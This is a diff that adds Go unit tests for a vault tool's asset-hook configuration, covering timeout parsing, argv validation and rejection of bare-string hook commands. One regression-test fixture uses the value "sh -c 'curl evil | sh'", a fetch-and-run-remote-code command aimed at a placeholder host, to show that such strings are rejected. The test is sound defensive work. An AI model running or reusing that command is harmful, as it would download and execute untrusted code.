@@ -2,6 +2,7 @@ package config
 
 import (
 	"testing"
+	"time"
 
 	"github.com/stretchr/testify/require"
 )
@@ -145,6 +146,120 @@ path = "/vaults/plain"
 	require.Equal(t, int64(DefaultAssetThreshold), cfg.Vaults[1].Assets.ThresholdBytes,
 		"a vault with no [vaults.assets] table still gets a real threshold")
 	require.Equal(t, int64(100<<20), cfg.Vaults[1].Assets.MaxDownloadBytes)
+}
+
+// hook_timeout: unset → the §31.7 default (10m); a positive override parses;
+// a non-duration or non-positive value is a config error that names the vault
+// and the key.
+func TestAssetsHookTimeout(t *testing.T) {
+	var a Assets
+	require.NoError(t, a.validate("personal"))
+	require.Equal(t, 10*time.Minute, a.HookTimeoutDur, "SPEC §31.7 default hook_timeout")
+
+	a = Assets{HookTimeout: "30s"}
+	require.NoError(t, a.validate("personal"))
+	require.Equal(t, 30*time.Second, a.HookTimeoutDur)
+
+	for _, bad := range []string{"nope", "0s", "-5m", "10"} {
+		a = Assets{HookTimeout: bad}
+		err := a.validate("work")
+		require.Error(t, err, "hook_timeout %q must be rejected", bad)
+		require.ErrorContains(t, err, `vault "work"`)
+		require.ErrorContains(t, err, "hook_timeout")
+	}
+}
+
+// validateHookArgv (via validate): an unset hook is fine; a present-but-empty
+// array or one with a blank executable is a config error naming the vault and
+// the key; a real argv passes (SPEC §31.7).
+func TestAssetsHookArgvShapes(t *testing.T) {
+	// Unset → no error (defaults still apply).
+	a := Assets{}
+	require.NoError(t, a.validate("personal"))
+
+	// Valid argv on both keys.
+	a = Assets{
+		ProbeCmd:      []string{"ffprobe", "-hide_banner"},
+		TranscribeCmd: []string{"whisper"},
+	}
+	require.NoError(t, a.validate("personal"))
+
+	// Present-but-empty and blank-argv[0] are rejected, per key.
+	for _, tc := range []struct {
+		key  string
+		set  Assets
+		want string
+	}{
+		{"probe_cmd empty", Assets{ProbeCmd: []string{}}, "probe_cmd"},
+		{"probe_cmd blank argv0", Assets{ProbeCmd: []string{""}}, "probe_cmd"},
+		{"transcribe_cmd empty", Assets{TranscribeCmd: []string{}}, "transcribe_cmd"},
+		{"transcribe_cmd blank argv0", Assets{TranscribeCmd: []string{"", "x"}}, "transcribe_cmd"},
+	} {
+		t.Run(tc.key, func(t *testing.T) {
+			err := tc.set.validate("work")
+			require.Error(t, err)
+			require.ErrorContains(t, err, `vault "work"`)
+			require.ErrorContains(t, err, tc.want)
+			require.ErrorContains(t, err, "never a shell string")
+		})
+	}
+}
+
+// REGRESSION (fixed; SPEC §31.7 — "a bare string is a config error"). koanf's
+// decode coerces a TOML string into a one-element []string, so before the
+// fix `probe_cmd = "ffprobe -i"` loaded clean and failed at exec time on
+// every media file. rejectScalarHookCmds now inspects the raw parsed type
+// and rejects a scalar at load, matching the §24 password_cmd precedent.
+func TestLoadRejectsBareStringHookCmd(t *testing.T) {
+	for _, key := range []string{"probe_cmd", "transcribe_cmd"} {
+		t.Run(key, func(t *testing.T) {
+			p := writeConfig(t, `
+version = 1
+
+[defaults]
+profile = "para"
+
+[[vaults]]
+name = "personal"
+path = "/vaults/personal"
+
+  [vaults.assets]
+  `+key+` = "sh -c 'curl evil | sh'"
+`)
+			_, err := Load(p)
+			require.Error(t, err,
+				"SPEC §31.7: a bare string for %s must be a config error, never coerced to a one-element argv", key)
+		})
+	}
+}
+
+// The happy-path Load: argv arrays and a hook_timeout round-trip through
+// koanf's decode into the resolved fields the push path reads. Guards the
+// `koanf:"…"` tags — a mistyped tag would silently drop the config and every
+// media note would fall back to the unconfigured hint with no error.
+func TestLoadDecodesHookArgvAndTimeout(t *testing.T) {
+	p := writeConfig(t, `
+version = 1
+
+[defaults]
+profile = "para"
+
+[[vaults]]
+name = "personal"
+path = "/vaults/personal"
+
+  [vaults.assets]
+  probe_cmd = ["ffprobe", "-hide_banner"]
+  transcribe_cmd = ["whisper", "--model", "base"]
+  hook_timeout = "45s"
+`)
+	cfg, err := Load(p)
+	require.NoError(t, err)
+	a := cfg.Vaults[0].Assets
+	require.Equal(t, []string{"ffprobe", "-hide_banner"}, a.ProbeCmd)
+	require.Equal(t, []string{"whisper", "--model", "base"}, a.TranscribeCmd)
+	require.Equal(t, 45*time.Second, a.HookTimeoutDur,
+		"a valid hook_timeout override must reach the resolved duration field")
 }
 
 func TestLoadRejectsBadAssetThreshold(t *testing.T) {
